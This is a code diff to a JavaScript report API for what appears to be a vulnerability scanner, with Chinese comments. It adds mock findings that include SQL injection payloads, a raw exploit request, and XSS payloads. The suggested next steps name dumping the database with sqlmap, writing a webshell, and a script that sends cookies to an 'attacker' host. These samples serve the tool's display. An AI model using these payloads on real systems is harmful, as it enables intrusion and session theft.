@@ -2,6 +2,7 @@
  * 报告管理API服务
  */
 import { request } from './apiClient';
+import { USE_MOCK_DATA } from './config';
 
 // 报告状态枚举
 export const ReportStatus = {
@@ -269,7 +270,61 @@ export const getMockReportData = () => {
       { time: '10:40:00', event: '发现SQL注入漏洞', status: 'finding' },
       { time: '10:42:45', event: '发现XSS漏洞', status: 'finding' },
       { time: '10:45:30', event: '扫描完成', status: 'completed' }
-    ]
+    ],
+
+    // 验证结果 (由 VulnValidatorAgent 生成)
+    verified_findings: [
+      {
+        vuln_type: 'sqli',
+        target: 'http://192.168.1.100/login.php',
+        verified: true,
+        confidence: 0.97,
+        evidence: [
+          "payload: ' OR SLEEP(5)-- 触发 5.02s 延迟响应",
+          "payload: ' AND 1=1-- 返回正常页面 (200 OK)",
+          "payload: ' AND 1=2-- 返回空结果 (200 OK, body diff=1842 bytes)"
+        ],
+        exploit_proof: "POST /login.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'%20OR%20SLEEP(5)--%20&password=x\n\n--- Response (5.02s) ---\nHTTP/1.1 200 OK",
+        suggested_next: "使用 sqlmap --dump 提取数据库，或尝试写入 webshell (INTO OUTFILE)。",
+        raw_findings: [
+          { type: 'time_based_blind', delay: 5.02 },
+          { type: 'boolean_based', difference: 1842 }
+        ]
+      },
+      {
+        vuln_type: 'xss',
+        target: 'http://192.168.1.100/search.php?q=',
+        verified: true,
+        confidence: 0.88,
+        evidence: [
+          "payload: <script>alert(1)</script> 在响应体中原样返回，未转义",
+          "响应 Content-Type: text/html，无 X-XSS-Protection 头"
+        ],
+        exploit_proof: "GET /search.php?q=<script>alert(document.cookie)</script>\n\n--- Response body excerpt ---\n<div class=\"results\"><script>alert(document.cookie)</script></div>",
+        suggested_next: "尝试窃取管理员 Cookie：构造 <script>fetch('https://attacker/x?c='+document.cookie)</script> 并诱导管理员访问。",
+        raw_findings: [{ type: 'reflected_xss', reflected: true }]
+      }
+    ],
+
+    // 未验证/疑似漏洞
+    unverified_findings: [
+      {
+        vuln_type: 'lfi',
+        target: 'http://192.168.1.100/page.php?file=',
+        verified: false,
+        confidence: 0.42,
+        description: '响应中出现 /etc/passwd 路径特征，但未能获取文件内容，可能存在过滤。建议人工确认。'
+      },
+      {
+        vuln_type: 'rce',
+        target: 'http://192.168.1.100/admin/exec.php',
+        verified: false,
+        confidence: 0.31,
+        error: '验证超时 (30s)，服务器无响应，可能存在 WAF 拦截。'
+      }
+    ],
+    verified_count: 2,
+    unverified_count: 2
   };
 };
 
